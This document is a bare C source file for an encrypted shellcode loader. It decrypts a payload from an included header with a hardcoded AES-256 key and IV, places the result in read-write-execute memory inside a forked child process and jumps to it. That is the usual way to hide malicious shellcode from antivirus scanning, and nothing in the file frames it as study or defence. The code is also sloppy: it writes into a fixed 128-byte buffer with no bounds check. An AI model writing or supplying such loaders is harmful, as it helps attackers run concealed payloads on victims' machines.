#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <openssl/aes.h>
#include <openssl/err.h>

unsigned char key[32] = "01234567890123456789012345678901"; // AES-256 key
unsigned char iv[16] = "0123456789012345"; // AES-128 IV

void handleErrors(void) {
    ERR_print_errors_fp(stderr);
    abort();
}

void decrypt(unsigned char *ciphertext, int ciphertext_len, unsigned char *key,
             unsigned char *iv, unsigned char *plaintext) {
    EVP_CIPHER_CTX *ctx;

    int len;
    int plaintext_len;

    if (!(ctx = EVP_CIPHER_CTX_new())) handleErrors();

    if (1 != EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))
        handleErrors();

    if (1 != EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, ciphertext_len))
        handleErrors();
    plaintext_len = len;

    if (1 != EVP_DecryptFinal_ex(ctx, plaintext + len, &len)) handleErrors();
    plaintext_len += len;

    EVP_CIPHER_CTX_free(ctx);
}

// Include the generated header file
#include "encoded_payload.h"

int main() {
    unsigned char decrypted_buf[128];

    decrypt(encoded_payload, sizeof(encoded_payload) - 1, key, iv, decrypted_buf);

    pid_t pid = fork();
    if (pid < 0) {
        perror("fork");
        exit(EXIT_FAILURE);
    }

    if (pid == 0) { // Child process
        void *exec_mem = mmap(NULL, sizeof(decrypted_buf), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (exec_mem == MAP_FAILED) {
            perror("mmap");
            exit(EXIT_FAILURE);
        }

        memcpy(exec_mem, decrypted_buf, sizeof(decrypted_buf));

        ((void (*)(void))exec_mem)();

        munmap(exec_mem, sizeof(decrypted_buf));
        exit(0);
    } else { // Parent process
        wait(NULL); // Wait for the child process to finish
    }

    return 0;
}
